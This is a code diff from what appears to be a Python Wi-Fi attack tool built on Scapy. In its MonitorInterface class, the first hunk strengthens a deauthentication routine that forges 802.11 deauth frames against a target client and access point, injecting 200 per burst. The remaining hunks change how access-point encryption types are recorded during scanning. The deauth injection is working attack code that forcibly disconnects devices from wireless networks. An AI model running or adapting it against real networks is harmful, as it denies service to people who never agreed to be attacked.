@@ -90,9 +90,10 @@ class MonitorInterface(Interface):
             self.set_channel(channel)
         pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
         for i in range(count):
-            for j in range(100):
-                self.inject(pkt)
             cprint("DEAUTH!!!", 'red')
+            for j in range(200):
+                self.inject(pkt)
+            sleep(1)
         self.channel_lock.release()
 
     def get_new_client(self):
@@ -114,7 +115,7 @@ class MonitorInterface(Interface):
                     # http://stackoverflow.com/a/21664038
                     essid, channel, w = None, None, None
                     bssid = pkt.addr3
-                    crypto = set()
+                    crypto = ""
                     cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                                       "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
                     p = pkt[Dot11Elt]
@@ -132,16 +133,16 @@ class MonitorInterface(Interface):
                                 print(p.info)
                                 channel = p.info
                         elif p.ID == 48:
-                            crypto.add("WPA2")
+                            crypto = "WPA2"
                             w = p.info[18:19]
                         elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
-                            crypto.add("WPA")
+                            crypto = "WPA"
                         p = p.payload
                     if not crypto:
                         if 'privacy' in cap:
-                            crypto.add("WEP")
+                            crypto = "WEP"
                         else:
-                            crypto.add("OPN")
+                            crypto = "OPN"
                     self.aps.append(AP(bssid, essid, crypto, channel, w))
                     # print("Adding", bssid, essid, crypto, channel, self.targets[-1].w)
                     self.lock.release()
